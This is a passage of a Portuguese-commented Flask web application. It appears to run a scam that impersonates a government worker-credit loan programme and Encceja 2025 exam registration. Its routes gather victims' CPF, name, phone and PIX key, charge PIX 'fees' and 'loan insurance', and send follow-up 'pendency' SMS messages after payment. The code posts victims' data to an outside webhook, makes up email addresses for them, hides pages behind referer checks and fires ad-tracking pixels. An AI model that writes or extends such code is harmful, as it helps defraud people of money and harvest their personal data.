    except Exception as e:
        app.logger.error(f"[PROD] Erro ao criar pagamento com desconto: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/check-payment-status')
def check_discount_payment_status():
    try:
        payment_id = request.args.get('id')
        
        if not payment_id:
            app.logger.error("[PROD] ID de pagamento não fornecido")
            return jsonify({"error": "ID de pagamento não fornecido"}), 400
        
        # Criar uma instância da API de pagamento com desconto
        from pagamentocomdesconto import create_payment_with_discount_api
        payment_api = create_payment_with_discount_api()
        
        # Verificar o status do pagamento
        app.logger.info(f"[PROD] Verificando status do pagamento com desconto: {payment_id}")
        result = payment_api.check_payment_status(payment_id)
        
        if "error" in result:
            app.logger.error(f"[PROD] Erro ao verificar status do pagamento: {result['error']}")
            return jsonify(result), 500
        
        app.logger.info(f"[PROD] Status do pagamento verificado: {result.get('status', 'N/A')}")
        return jsonify(result)
    
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar status do pagamento: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/buscar-cpf')
@check_referer
def buscar_cpf():
    try:
        verification_token = os.environ.get('VERIFICATION_TOKEN')
        if not verification_token:
            app.logger.error("[PROD] VERIFICATION_TOKEN not found in environment variables")
            return jsonify({'error': 'Configuration error'}), 500
            
        exato_api_token = os.environ.get('EXATO_API_TOKEN')
        if not exato_api_token:
            app.logger.error("[PROD] EXATO_API_TOKEN not found in environment variables")
            return jsonify({'error': 'API Token configuration error'}), 500

        app.logger.info("[PROD] Acessando página de busca de CPF: buscar-cpf.html")
        return render_template('buscar-cpf.html', verification_token=verification_token, exato_api_token=exato_api_token)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar busca de CPF: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/input-cpf')
@check_referer
def input_cpf():
    try:
        verification_token = os.environ.get('VERIFICATION_TOKEN')
        if not verification_token:
            app.logger.error("[PROD] VERIFICATION_TOKEN not found in environment variables")
            return jsonify({'error': 'Configuration error'}), 500

        app.logger.info("[PROD] Acessando página de entrada de CPF: input_cpf.html")
        return render_template('input_cpf.html', verification_token=verification_token)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar entrada de CPF: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/analisar-cpf')
@check_referer
def analisar_cpf():
    try:
        app.logger.info("[PROD] Acessando página de análise de CPF: analisar_cpf.html")
        exato_api_token = os.environ.get('EXATO_API_TOKEN')
        if not exato_api_token:
            app.logger.error("[PROD] EXATO_API_TOKEN not found in environment variables")
            return jsonify({'error': 'API Token configuration error'}), 500
        
        return render_template('analisar_cpf.html', exato_api_token=exato_api_token)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar análise de CPF: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/opcoes-emprestimo')
@check_referer
def opcoes_emprestimo():
    try:
        # Get query parameters
        cpf = request.args.get('cpf')
        nome = request.args.get('nome')
        
        if not cpf or not nome:
            app.logger.error("[PROD] CPF ou nome não fornecidos")
            return redirect('/input-cpf')
            
        app.logger.info(f"[PROD] Acessando página de opções de empréstimo para CPF: {cpf}")
        return render_template('opcoes_emprestimo.html')
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar opções de empréstimo: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/aviso')
@check_referer
def seguro_prestamista():
    try:
        # Get customer data from query parameters
        customer = {
            'nome': request.args.get('nome', ''),
            'cpf': request.args.get('cpf', ''),
            'phone': request.args.get('phone', ''),
            'pix_key': request.args.get('pix_key', ''),
            'bank': request.args.get('bank', ''),
            'amount': request.args.get('amount', '0'),
            'term': request.args.get('term', '0')
        }
        
        app.logger.info(f"[PROD] Renderizando página de aviso sobre seguro prestamista: {customer}")
        return render_template('aviso.html', customer=customer)
    except Exception as e:
        app.logger.error(f"[PROD] Erro na página de aviso: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/obrigado')
def thank_you():
    try:
        # Get customer data from query parameters if available
        customer = {
            'name': request.args.get('nome', ''),
            'cpf': request.args.get('cpf', ''),
            'phone': request.args.get('phone', ''),
            'bank': request.args.get('bank', 'Caixa Econômica Federal'),
            'pix_key': request.args.get('pix_key', ''),
            'loan_amount': request.args.get('loan_amount', '4000')
        }
        
        app.logger.info(f"[PROD] Renderizando página de agradecimento com dados: {customer}")
        meta_pixel_id = os.environ.get('META_PIXEL_ID')
        return render_template('thank_you.html', customer=customer, meta_pixel_id=meta_pixel_id)
    except Exception as e:
        app.logger.error(f"[PROD] Erro na página de obrigado: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500
        
@app.route('/create-pix-payment', methods=['POST'])
@check_referer
def create_pix_payment():
    try:
        # Validar dados da requisição
        if not request.is_json:
            app.logger.error("[PROD] Requisição inválida: conteúdo não é JSON")
            return jsonify({'error': 'Requisição inválida: formato JSON esperado'}), 400
            
        data = request.json
        
        # Verificar campos obrigatórios
        required_fields = ['name', 'cpf', 'amount']
        for field in required_fields:
            if field not in data or not data[field]:
                app.logger.error(f"[PROD] Campo obrigatório ausente: {field}")
                return jsonify({'error': f'Campo obrigatório ausente: {field}'}), 400
                
        # Se o telefone estiver presente na requisição, garantir que esteja formatado corretamente
        if 'phone' in data and data['phone']:
            # Limpar caracteres não numéricos do telefone
            data['phone'] = ''.join(filter(str.isdigit, data['phone']))
            app.logger.info(f"[PROD] Telefone fornecido na requisição JSON: {data['phone']}")
        
        # Gerar chave de idempotência baseada nos dados do usuário
        import hashlib
        cpf_clean = ''.join(filter(str.isdigit, data['cpf']))
        nome_clean = ''.join(c.lower() for c in data['name'] if c.isalnum())
        amount = float(data['amount'])
        idempotency_key = f"{cpf_clean}_{nome_clean}_{amount}"
        idempotency_hash = hashlib.md5(idempotency_key.encode()).hexdigest()
        
        # Verificar se já existe um pagamento na sessão para este usuário
        existing_payment_key = f"create_pix_{idempotency_hash}"
        if existing_payment_key in session:
            existing_payment = session[existing_payment_key]
            app.logger.info(f"[PROD] Pagamento PIX já existe na sessão para {data['name']} ({data['cpf']}): {existing_payment.get('transaction_id')}")
            return jsonify(existing_payment)
        
        app.logger.info(f"[PROD] Iniciando criação de pagamento PIX: {data}")
        
        # Usar a API NovaEra (padrão da aplicação via payment_gateway)
        from payment_gateway import get_payment_gateway
        
        try:
            # Obtém o gateway padrão configurado que deve ser NovaEra
            api = get_payment_gateway()
            app.logger.info("[PROD] API de pagamento inicializada com sucesso")
        except ValueError as e:
            app.logger.error(f"[PROD] Erro ao inicializar API de pagamento: {str(e)}")
            return jsonify({'error': 'Serviço de pagamento indisponível no momento. Tente novamente mais tarde.'}), 500
        
        # Criar o pagamento PIX
        try:
            # Padronizar os nomes dos campos para corresponder ao esperado pela API
            payment_data = {
                'name': data.get('name'),
                'email': data.get('email', ''),
                'cpf': data.get('cpf'),
                'phone': data.get('phone', ''),
                'amount': data.get('amount')
            }
            
            payment_result = api.create_pix_payment(payment_data)
            app.logger.info(f"[PROD] Pagamento PIX criado com sucesso: {payment_result}")
            
            # Construir resposta com suporte a ambos formatos (NovaEra e For4Payments)
            response = {
                'transaction_id': payment_result.get('id'),
                'pix_code': payment_result.get('pix_code'),
                'pix_qr_code': payment_result.get('pix_qr_code'),
                'status': payment_result.get('status', 'pending')
            }
            
            # Adicionar dados de PIX se disponíveis no resultado (para compatibilidade com Cashtime)
            if payment_result and 'orders' in payment_result:
                orders_data = payment_result['orders']
                if 'paymentCode' in orders_data and orders_data['paymentCode']:
                    # Adicionar código PIX no formato esperado pelo frontend
                    response['pix_code'] = orders_data['paymentCode']
                    # Gerar QR code via API externa usando o código PIX
                    pix_code = orders_data['paymentCode']
                    qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=200x200&data={pix_code}"
                    response['pix_qr_code'] = qr_url
                    app.logger.info(f"[PIX] Adicionado código PIX e QR code na criação: {pix_code[:50]}...")
            
            # Se ainda não temos PIX code, tentar obter diretamente do payment_result
            if not response.get('pix_code'):
                # Cashtime API às vezes retorna o código PIX diretamente
                if payment_result.get('paymentCode'):
                    response['pix_code'] = payment_result['paymentCode']
                    pix_code = payment_result['paymentCode']
                    qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=200x200&data={pix_code}"
                    response['pix_qr_code'] = qr_url
                    app.logger.info(f"[PIX] Código PIX obtido diretamente do resultado: {pix_code[:50]}...")
            
            # Armazenar na sessão com chave de idempotência
            session[existing_payment_key] = response
            app.logger.info(f"[PROD] Pagamento PIX armazenado na sessão: {response.get('transaction_id')}")
            
            return jsonify(response)
            
        except ValueError as e:
            app.logger.error(f"[PROD] Erro ao criar pagamento PIX: {str(e)}")
            return jsonify({'error': str(e)}), 400
        except Exception as e:
            app.logger.error(f"[PROD] Erro inesperado ao criar pagamento PIX: {str(e)}")
            return jsonify({'error': 'Erro ao processar pagamento. Tente novamente mais tarde.'}), 500
            
    except Exception as e:
        app.logger.error(f"[PROD] Erro geral ao processar requisição: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500
        
@app.route('/verificar-pagamento', methods=['POST'])
@check_referer
def verificar_pagamento():
    try:
        data = request.get_json()
        transaction_id = data.get('transactionId')
        
        if not transaction_id:
            app.logger.error("[PROD] ID da transação não fornecido")
            return jsonify({'error': 'ID da transação é obrigatório', 'status': 'error'}), 400
            
        app.logger.info(f"[PROD] Verificando status do pagamento: {transaction_id}")
        
        # Usar a API de pagamento configurada
        api = get_payment_gateway()
        gateway_type = type(api).__name__
        app.logger.info(f"[DEBUG] Gateway utilizado: {gateway_type}")
        
        # Verificar status do pagamento
        status_result = api.check_payment_status(transaction_id)
        app.logger.info(f"[PROD] Status do pagamento COMPLETO: {status_result}")
        
        # Log específico do status para debug
        current_status = status_result.get('status', 'unknown')
        app.logger.info(f"[DEBUG] Status atual extraído: {current_status}")
        
        # Verificar se o ID de transação é válido
        if not status_result or status_result.get('error'):
            app.logger.warning(f"[DEBUG] Transação inválida ou não encontrada: {transaction_id}")
            return jsonify({'status': 'pending', 'error': 'Transação não encontrada'}), 200
        
        # PROTEÇÃO CONTRA FALSOS POSITIVOS
        # Verificar se a transação realmente existe antes de considerá-la paga
        if not status_result or status_result.get('error') or not status_result.get('status'):
            app.logger.warning(f"[DEBUG] Transação inválida ou não encontrada: {transaction_id}")
            return jsonify({'status': 'pending', 'error': 'Transação não encontrada'}), 200
        
        # Verificar se o pagamento foi confirmado com validação rigorosa
        # Compatibilidade com NovaEra ('paid', 'completed') e For4Payments ('APPROVED', 'PAID', 'COMPLETED')
        current_status = status_result.get('status', '').upper()
        original_status = status_result.get('original_status', '').upper()
        
        # Lista de status que indicam pagamento confirmado
        paid_statuses = ['PAID', 'COMPLETED', 'APPROVED']
        
        # Verificar se o status atual ou original indica pagamento confirmado
        is_paid = (current_status in paid_statuses or 
                  original_status in paid_statuses or
                  status_result.get('status') in ['paid', 'completed'])
        
        app.logger.info(f"[DEBUG] Status atual: {current_status}, Status original: {original_status}, Está pago: {is_paid}")
        
        if is_paid:
            app.logger.info(f"[PROD] Pagamento confirmado, ID da transação: {transaction_id}")
            app.logger.info(f"[FACEBOOK_PIXEL] Registrando evento de conversão para os pixels: 1418766538994503, 1345433039826605 e 1390026985502891")
            
            # Adicionar os IDs dos Pixels ao resultado para processamento no frontend
            status_result['facebook_pixel_id'] = ['1418766538994503', '1345433039826605', '1390026985502891']
            
            # Enviar SMS de pendência para todos os gateways após pagamento confirmado
            gateway_choice = os.environ.get('GATEWAY_CHOICE', 'for4')
            app.logger.info(f"[SMS] Gateway configurado: {gateway_choice} - enviando SMS de pendência")
            
            # Obter dados do usuário da sessão
            payment_data = session.get('payment_data', {})
            app.logger.info(f"[SMS] Dados da sessão payment_data: {payment_data}")
            
            # Obter dados do cliente diretamente da resposta da API
            customer_data = None
            try:
                # Obter dados completos da transação da API
                api_gateway = get_payment_gateway()
                full_response = api_gateway.check_payment_status(transaction_id)
                
                # Acessar dados do cliente na estrutura retornada (diferente para cada gateway)
                if isinstance(full_response, dict):
                    # Para Cashtime API
                    if gateway_choice.lower() in ['cashtime', 'cash']:
                        orders_data = full_response.get('orders', {})
                        if orders_data and 'customer' in orders_data:
                            customer_data = orders_data['customer']
                            app.logger.info(f"[SMS] Dados do cliente obtidos da API Cashtime: {customer_data}")
                    # Para For4Payments API
                    else:
                        # Tentar acessar dados do cliente na estrutura For4Payments
                        if 'customer' in full_response:
                            customer_data = full_response['customer']
                            app.logger.info(f"[SMS] Dados do cliente obtidos da API For4Payments: {customer_data}")
            except Exception as e:
                app.logger.error(f"[SMS] Erro ao obter dados do cliente: {str(e)}")
            
            # Priorizar dados da API se disponíveis
            if customer_data:
                payment_data = {
                    'name': customer_data.get('name', ''),
                    'phone': customer_data.get('phone', ''),
                    'cpf': customer_data.get('cpfCnpj', customer_data.get('cpf', ''))
                }
                app.logger.info(f"[SMS] Usando dados do cliente da API: {payment_data}")
            elif not payment_data:
                app.logger.warning(f"[SMS] Nenhum dado do cliente encontrado")
            
            if payment_data and payment_data.get('phone'):
                phone = payment_data.get('phone', '')
                nome = payment_data.get('name', '')
                
                # Obter primeiro nome
                first_name = nome.split()[0] if nome else 'Cliente'
                
                app.logger.info(f"[SMS] Pagamento aprovado - enviando SMS de pendência para {first_name} ({phone})")
                
                # Enviar SMS de pendência via Fluxons
                sms_sent = send_payment_pendency_sms(phone, first_name)
                if sms_sent:
                    app.logger.info(f"[SMS] SMS de pendência enviado com sucesso para {first_name} ({phone})")
                else:
                    app.logger.error(f"[SMS] Falha ao enviar SMS de pendência para {first_name} ({phone})")
            else:
                app.logger.warning(f"[SMS] Dados do usuário insuficientes para envio de SMS")
                app.logger.info(f"[SMS] Dados da sessão completos: {dict(session)}")
                app.logger.info(f"[SMS] Payment data final: {payment_data}")
        
        return jsonify(status_result)
    
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar status do pagamento: {str(e)}")
        return jsonify({'error': f'Erro ao verificar status: {str(e)}', 'status': 'error'}), 500

@app.route('/check-for4payments-status', methods=['GET', 'POST'])
@check_referer
def check_for4payments_status():
    try:
        transaction_id = request.args.get('transaction_id')
        
        if not transaction_id:
            # Verificar se foi enviado no corpo da requisição (compatibilidade)
            data = request.get_json(silent=True)
            if data and data.get('id'):
                transaction_id = data.get('id')
            else:
                app.logger.error("[PROD] ID da transação não fornecido")
                return jsonify({'error': 'ID da transação é obrigatório'}), 400
            
        app.logger.info(f"[PROD] Verificando status do pagamento: {transaction_id}")
        
        # Usar o gateway de pagamento configurado
        try:
            api = get_payment_gateway()
        except ValueError as e:
            app.logger.error(f"[PROD] Erro ao inicializar gateway de pagamento: {str(e)}")
            return jsonify({'error': 'Serviço de pagamento indisponível no momento.'}), 500
        
        # Verificar status do pagamento
        status_result = api.check_payment_status(transaction_id)
        app.logger.info(f"[PROD] Status do pagamento: {status_result}")
        
        # Adicionar dados de PIX para compatibilidade com o frontend
        if status_result and 'orders' in status_result:
            orders_data = status_result['orders']
            if 'paymentCode' in orders_data and orders_data['paymentCode']:
                # Adicionar código PIX no formato esperado pelo frontend
                status_result['pix_code'] = orders_data['paymentCode']
                # Gerar QR code via API externa usando o código PIX
                pix_code = orders_data['paymentCode']
                qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=200x200&data={pix_code}"
                status_result['pix_qr_code'] = qr_url
                app.logger.info(f"[PIX] Adicionado código PIX e QR code para frontend: {pix_code[:50]}...")
        
        # Verificar se o pagamento foi aprovado
        # Compatibilidade com NovaEra ('paid', 'completed') e For4Payments ('APPROVED', 'PAID', 'COMPLETED')
        if (status_result.get('status') == 'completed' or 
            status_result.get('status') == 'paid' or
            status_result.get('status') == 'PAID' or 
            status_result.get('status') == 'COMPLETED' or 
            status_result.get('status') == 'APPROVED' or
            status_result.get('original_status') in ['APPROVED', 'PAID', 'COMPLETED']):
            # Obter informações do usuário dos parâmetros da URL ou da sessão
            nome = request.args.get('nome', '')
            cpf = request.args.get('cpf', '')
            phone = request.args.get('phone', '')
            
            app.logger.info(f"[PROD] Pagamento {transaction_id} aprovado. Enviando SMS com link de agradecimento.")
            
            # Construir o URL personalizado para a página de agradecimento
            thank_you_url = request.url_root.rstrip('/') + '/obrigado'
            
            # Obter dados adicionais (banco, chave PIX e valor do empréstimo)
            bank = request.args.get('bank', 'Caixa Econômica Federal')
            pix_key = request.args.get('pix_key', cpf if cpf else '')
            loan_amount = request.args.get('loan_amount', '4000')
            
            # Adicionar parâmetros do usuário, se disponíveis
            params = {
                'nome': nome if nome else '',
                'cpf': cpf if cpf else '',
                'phone': phone if phone else '',
                'bank': bank,
                'pix_key': pix_key,
                'loan_amount': loan_amount,
                'utm_source': 'smsempresa',
                'utm_medium': 'sms',
                'utm_campaign': '',
                'utm_content': phone if phone else ''
            }
                
            # Construir a URL completa com parâmetros codificados corretamente
            if params:
                # Usar urllib para codificar os parâmetros corretamente
                import urllib.parse
                query_string = '&'.join([f"{key}={urllib.parse.quote(str(value))}" for key, value in params.items()])
                thank_you_url += '?' + query_string
            
            # Enviar SMS apenas se o número de telefone estiver disponível
            if phone:
                # Usando a função especializada para enviar SMS de confirmação de pagamento
                success = send_payment_confirmation_sms(phone, nome, cpf, thank_you_url)
                if success:
                    app.logger.info(f"[PROD] SMS de confirmação enviado com sucesso para {phone}")
                else:
                    app.logger.error(f"[PROD] Falha ao enviar SMS de confirmação para {phone}")
        
        return jsonify(status_result)
        
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar status do pagamento: {str(e)}")
        return jsonify({'status': 'pending', 'error': str(e)})

@app.route('/send-verification-code', methods=['POST'])
@check_referer
def send_verification_code_route():
    try:
        data = request.json
        phone_number = data.get('phone')

        if not phone_number:
            return jsonify({'success': False, 'message': 'Número de telefone não fornecido'}), 400

        success, result = send_verification_code(phone_number)

        if success:
            # Store the verification code temporarily (in a real app, this should use Redis or similar)
            # For demo purposes, we'll just return it directly (not ideal for security)
            return jsonify({
                'success': True, 
                'message': 'Código enviado com sucesso',
                'verification_code': result  # In a real app, don't send this back to client
            })
        else:
            return jsonify({'success': False, 'message': result}), 400

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao enviar código de verificação: {str(e)}")
        return jsonify({'success': False, 'message': 'Erro ao enviar código de verificação'}), 500

@app.route('/atualizar-cadastro', methods=['POST'])
def atualizar_cadastro():
    try:
        app.logger.info("[PROD] Recebendo atualização cadastral")
        # Log form data for debugging
        app.logger.debug(f"Form data: {request.form}")

        # Extract form data
        data = {
            'birth_date': request.form.get('birth_date'),
            'cep': request.form.get('cep'),
            'employed': request.form.get('employed'),
            'salary': request.form.get('salary'),
            'household_members': request.form.get('household_members')
        }

        app.logger.info(f"[PROD] Dados recebidos: {data}")

        # Aqui você pode adicionar a lógica para processar os dados
        # Por enquanto, vamos apenas redirecionar para a página de pagamento
        nome = request.form.get('nome', '')
        cpf = request.form.get('cpf', '')
        phone = request.form.get('phone', '')  # Obter número de telefone do formulário

        return redirect(url_for('payment_update', nome=nome, cpf=cpf, phone=phone))

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao atualizar cadastro: {str(e)}")
        return jsonify({'error': 'Erro ao processar atualização cadastral'}), 500

@app.route('/sms-config')
def sms_config():
    try:
        # Check SMS API key status
        smsdev_status = bool(os.environ.get('SMSDEV_API_KEY'))
        owen_status = bool(os.environ.get('SMS_OWEN_TOKEN'))

        # Get test result from session if available
        test_result = session.pop('test_result', None)
        test_success = session.pop('test_success', None)

        return render_template('sms_config.html',
                              current_api=SMS_API_CHOICE,
                              smsdev_status=smsdev_status,
                              owen_status=owen_status,
                              test_result=test_result,
                              test_success=test_success)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar configuração SMS: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/update-sms-config', methods=['POST'])
def update_sms_config():
    try:
        sms_api = request.form.get('sms_api', 'SMSDEV')

        # In a real application, this would be saved to a database
        # But for this demo, we'll use a global variable
        global SMS_API_CHOICE
        SMS_API_CHOICE = sms_api

        app.logger.info(f"[PROD] API SMS atualizada para: {sms_api}")

        # We would typically use Flask's flash() here, but for simplicity we'll use a session variable
        session['test_result'] = f"Configuração atualizada para {sms_api}"
        session['test_success'] = True

        return redirect(url_for('sms_config'))
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao atualizar configuração SMS: {str(e)}")
        session['test_result'] = f"Erro ao atualizar configuração: {str(e)}"
        session['test_success'] = False
        return redirect(url_for('sms_config'))

@app.route('/test-countdown')
def test_countdown():
    """Página de teste para o cronômetro PIX"""
    try:
        with open('test_countdown.html', 'r', encoding='utf-8') as f:
            html_content = f.read()
        return html_content
    except Exception as e:
        return f"Erro ao carregar o teste: {str(e)}", 500

@app.route('/send-test-sms', methods=['POST'])
def send_test_sms():
    try:
        phone = request.form.get('phone', '')

        if not phone:
            session['test_result'] = "Por favor, forneça um número de telefone válido"
            session['test_success'] = False
            return redirect(url_for('sms_config'))

        # Message template for test
        message = "[PROGRAMA CREDITO DO TRABALHADOR] Esta é uma mensagem de teste do sistema."

        # Choose which API to use based on SMS_API_CHOICE
        if SMS_API_CHOICE.upper() == 'OWEN':
            success = send_sms_owen(phone, message)
        else:  # Default to SMSDEV
            success = send_sms_smsdev(phone, message)

        if success:
            session['test_result'] = f"SMS de teste enviado com sucesso para {phone}"
            session['test_success'] = True
        else:
            session['test_result'] = f"Falha ao enviar SMS para {phone}. Verifique o número e tente novamente."
            session['test_success'] = False

        return redirect(url_for('sms_config'))
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao enviar SMS de teste: {str(e)}")
        session['test_result'] = f"Erro ao enviar SMS de teste: {str(e)}"
        session['test_success'] = False
        return redirect(url_for('sms_config'))

@app.route('/encceja')
def encceja():
    """Página do Encceja 2025"""
    return render_template('encceja.html')

@app.route('/inscricao')
def inscricao():
    """Página de inscrição do Encceja 2025"""
    return render_template('inscricao.html')

@app.route('/validar-dados')
def validar_dados():
    """Página de validação de dados do usuário"""
    return render_template('validar_dados.html')

@app.route('/endereco')
def endereco():
    """Página de cadastro de endereço"""
    return render_template('endereco.html')

@app.route('/local-prova')
def local_prova():
    """Página de seleção do local de prova"""
    return render_template('local_prova.html')

@app.route('/inscricao-sucesso')
def inscricao_sucesso():
    """Página de sucesso da inscrição"""
    return render_template('inscricao_sucesso.html')

@app.route('/encceja-info')
def encceja_info():
    """Página com informações detalhadas sobre o Encceja"""
    return render_template('encceja_info.html')

def send_webhook(user_data):
    """Envia webhook com dados do usuário para o webhook-manager"""
    webhook_url = "https://webhook-manager.replit.app/api/webhook/maexknedsfxxxl2abaxech2glxnizlya"
    
    try:
        # Gerar IDs únicos para o webhook
        payment_id = str(uuid.uuid4())
        customer_id = str(uuid.uuid4())
        item_id = str(uuid.uuid4())
        
        # Estruturar os dados no formato do webhook
        webhook_data = {
            "utm": "",
            "dueAt": None,
            "items": [
                {
                    "id": item_id,
                    "title": "Inscrição 2025",
                    "quantity": 1,
                    "tangible": False,
                    "paymentId": payment_id,
                    "unitPrice": int(user_data.get('amount', 83.40) * 100)  # Converter para centavos
                }
            ],
            "status": "PENDING",
            "pixCode": user_data.get('pixCode', ''),
            "customId": f"FOR{random.randint(100000000000, 999999999999999)}",
            "customer": {
                "id": customer_id,
                "cep": None,
                "cpf": user_data.get('cpf', ''),
                "city": None,
                "name": user_data.get('nome', ''),
                "email": user_data.get('email', ''),
                "phone": re.sub(r'\D', '', user_data.get('telefone', '')),
                "state": None,
                "number": None,
                "street": None,
                "district": None,
                "createdAt": datetime.utcnow().isoformat() + "Z",
                "updatedAt": datetime.utcnow().isoformat() + "Z",
                "complement": None
            },
            "netValue": int(user_data.get('amount', 83.40) * 100 * 0.93),  # Valor líquido (aproximação)
            "billetUrl": None,
            "createdAt": datetime.utcnow().isoformat() + "Z",
            "expiresAt": None,
            "paymentId": payment_id,
            "pixQrCode": user_data.get('pixQrCode', ''),
            "timestamp": int(time.time() * 1000),
            "updatedAt": datetime.utcnow().isoformat() + "Z",
            "approvedAt": None,
            "billetCode": None,
            "externalId": "",
            "refundedAt": None,
            "rejectedAt": None,
            "totalValue": int(user_data.get('amount', 83.40) * 100),
            "checkoutUrl": "",
            "referrerUrl": "",
            "chargebackAt": None,
            "installments": None,
            "paymentMethod": "PIX",
            "deliveryStatus": None
        }
        
        # Enviar webhook
        response = requests.post(
            webhook_url,
            json=webhook_data,
            headers={'Content-Type': 'application/json'},
            timeout=10
        )
        
        if response.status_code == 200:
            app.logger.info(f"[WEBHOOK] Webhook enviado com sucesso para {user_data.get('nome')} ({user_data.get('cpf')})")
        else:
            app.logger.warning(f"[WEBHOOK] Erro ao enviar webhook: {response.status_code} - {response.text}")
            
    except Exception as e:
        app.logger.error(f"[WEBHOOK] Erro ao enviar webhook: {str(e)}")

@app.route('/pagamento', methods=['GET', 'POST'])
def pagamento_encceja():
    """Página de pagamento da taxa do Encceja"""
    if request.method == 'POST':
        # Obter dados do usuário
        data = request.get_json()
        nome = data.get('nome')
        cpf = data.get('cpf')
        telefone = data.get('telefone')
        has_discount = data.get('has_discount', False)
        
        if not nome or not cpf:
            return jsonify({'error': 'Dados obrigatórios não fornecidos'}), 400
        
        # Preparar dados do usuário para o webhook
        amount = 49.70 if has_discount else 83.40
        email = f"{nome.lower().replace(' ', '')}@gmail.com"
        
        user_data = {
            'nome': nome,
            'cpf': cpf,
            'telefone': telefone or '',
            'email': email,
            'amount': amount,
            'pixCode': '',  # Será preenchido após criar o pagamento
            'pixQrCode': ''  # Será preenchido após criar o pagamento
        }
        
        # Enviar webhook com dados do usuário
        send_webhook(user_data)
        app.logger.info(f"[WEBHOOK] Webhook enviado para usuário que acessou /pagamento: {nome} ({cpf})")
        
        # Gerar chave de idempotência baseada nos dados do usuário
        import hashlib
        cpf_clean = ''.join(filter(str.isdigit, cpf))
        nome_clean = ''.join(c.lower() for c in nome if c.isalnum())
        amount = 49.70 if has_discount else 83.40
        idempotency_key = f"{cpf_clean}_{nome_clean}_{amount}"
        idempotency_hash = hashlib.md5(idempotency_key.encode()).hexdigest()
        
        # Verificar se já existe um pagamento na sessão para este usuário
        existing_payment_key = f"payment_{idempotency_hash}"
        if existing_payment_key in session:
            existing_payment = session[existing_payment_key]
            app.logger.info(f"[PROD] Pagamento já existe na sessão para {nome} ({cpf}): {existing_payment.get('id')}")
            return jsonify(existing_payment)
        
        try:
            if has_discount:
                # Usar API de pagamento através do gateway configurado
                app.logger.info(f"[PROD] Criando pagamento com desconto para: {nome} ({cpf})")
                payment_api = get_payment_gateway()
                gateway_name = type(payment_api).__name__
                app.logger.info(f"[PROD] Usando gateway de pagamento: {gateway_name}")
                payment_result = payment_api.create_pix_payment({
                    'name': nome,
                    'cpf': cpf,
                    'phone': telefone,
                    'amount': 49.70,
                    'email': f"{nome.lower().replace(' ', '')}@gmail.com"
                })
            else:
                # Usar API de pagamento através do gateway configurado
                app.logger.info(f"[PROD] Criando pagamento regular para: {nome} ({cpf})")
                payment_api = get_payment_gateway()
                gateway_name = type(payment_api).__name__
                app.logger.info(f"[PROD] Usando gateway de pagamento: {gateway_name}")
                payment_result = payment_api.create_pix_payment({
                    'name': nome,
                    'cpf': cpf,
                    'phone': telefone,
                    'amount': 83.40,
                    'email': f"{nome.lower().replace(' ', '')}@gmail.com"
                })
            
            # Armazenar dados do pagamento na sessão com chave de idempotência
            if payment_result.get('id'):
                session[existing_payment_key] = {
                    'id': payment_result.get('id'),
                    'pixCode': payment_result.get('pixCode'),
                    'pixQrCode': payment_result.get('pixQrCode'),
                    'status': payment_result.get('status', 'pending'),
                    'idempotency_key': idempotency_hash
                }
                # Manter também a chave antiga para compatibilidade
                session['payment_data'] = session[existing_payment_key]
                app.logger.info(f"[PROD] Novo pagamento criado e armazenado: {payment_result.get('id')}")
            
            # Retornar os dados do pagamento
            return jsonify(payment_result)
        except Exception as e:
            app.logger.error(f"Erro ao criar pagamento: {str(e)}")
            
            # Gerar um código PIX de exemplo para caso de falha na API
            # Isso é necessário apenas para demonstração da interface no ambiente de desenvolvimento
            demo_payment_data = {
                'id': 'demo-123456',
                'pixCode': '00020126870014br.gov.bcb.pix2565pix.example.com/qr/demo/12345',
                # Não incluímos pixQrCode pois o JavaScript na página vai usar uma imagem de exemplo
                'status': 'PENDING'
            }
            
            # Retornar resposta com mensagem de erro, mas com dados de exemplo para a interface
            return jsonify({
                'warning': f"API de pagamento temporariamente indisponível: {str(e)}",
                **demo_payment_data
            }), 200  # Retornar 200 para a página processar normalmente, mas com alerta
    
    # Para requisições GET, renderizar a página de pagamento
    # Mas antes, tentar enviar webhook se tivermos dados do usuário na sessão
    try:
        # Verificar se há dados do usuário na sessão ou localStorage
        # Dados podem estar em session ou serem obtidos via JavaScript
        payment_data = session.get('payment_data')
        if payment_data:
            # Extrair dados do usuário da sessão
            # Tentar obter dados do customer se estiver disponível
            user_data = {
                'nome': payment_data.get('customer', {}).get('name', ''),
                'cpf': payment_data.get('customer', {}).get('cpf', ''),
                'telefone': payment_data.get('customer', {}).get('phone', ''),
                'email': payment_data.get('customer', {}).get('email', ''),
                'amount': payment_data.get('amount', 83.40),
                'pixCode': payment_data.get('pixCode', ''),
                'pixQrCode': payment_data.get('pixQrCode', '')
            }
            
            # Só enviar webhook se tiver dados mínimos
            if user_data['nome'] and user_data['cpf']:
                send_webhook(user_data)
                app.logger.info(f"[WEBHOOK] Webhook enviado para usuário que acessou GET /pagamento: {user_data['nome']} ({user_data['cpf']})")
    except Exception as e:
        app.logger.error(f"[WEBHOOK] Erro ao enviar webhook no GET: {str(e)}")
    
    return render_template('pagamento.html')

@app.route('/webhook-pagamento', methods=['POST'])
